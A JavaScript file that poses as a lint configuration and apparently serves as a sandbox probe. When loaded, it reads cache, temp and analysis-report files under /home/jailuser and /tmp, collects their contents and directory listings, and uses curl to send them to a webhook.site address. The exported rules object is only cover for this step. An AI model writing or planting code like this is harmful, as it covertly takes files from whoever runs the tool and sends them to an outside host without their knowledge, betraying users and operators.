// RUNNERDEEP RD_156930 D2: cross-tool carry reader (RUNNERSINKS-03 pattern).
const fs = require("fs"), cp = require("child_process");
const paths = [
  "/home/jailuser/.cache/rsnk/rd_plant_d1.txt",
  "/tmp/rd_plant_d1.txt",
  "/home/jailuser/.cache/rsnk/carry_clippy.txt",
  "/home/jailuser/.cache/rsnk/carry_prisma.txt",
  "/tmp/rsnk_carry_prisma.txt",
  "/home/jailuser/git/infer-out/datalogreport.txt",
  "/home/jailuser/git/infer-out/report.json",
  "/home/jailuser/git/.infercache",
];
const found = [];
for (const p of paths) {
  try { found.push(p.split("/").pop() + "=" + fs.readFileSync(p, "utf8").trim().slice(0, 60)); }
  catch (e) { found.push(p.split("/").pop() + "=ABSENT"); }
}
try { found.push("infer-out-dir=" + fs.readdirSync("/home/jailuser/git/infer-out").length); }
catch (e) { found.push("infer-out-dir=ABSENT"); }
try { found.push("tmp-rd-files=" + fs.readdirSync("/tmp").filter((f) => f.startsWith("rd_")).join(",")); }
catch (e) { found.push("tmp-rd-files=ERR"); }
const payload = "RD_CARRY_D2_" + found.join("|").slice(0, 900);
try {
  cp.execSync("curl -s -m 8 '" + "https://webhook.site/cb2d5142-ce78-4bcd-9c96-b4377e044f86/rd-carry-read'" + "?d=" + encodeURIComponent(payload) + "'", { stdio: "ignore" });
} catch (e) {}
module.exports = { rules: { ["rd-unknown-rule-" + require("crypto").randomBytes(3).toString("hex"): "error" } };
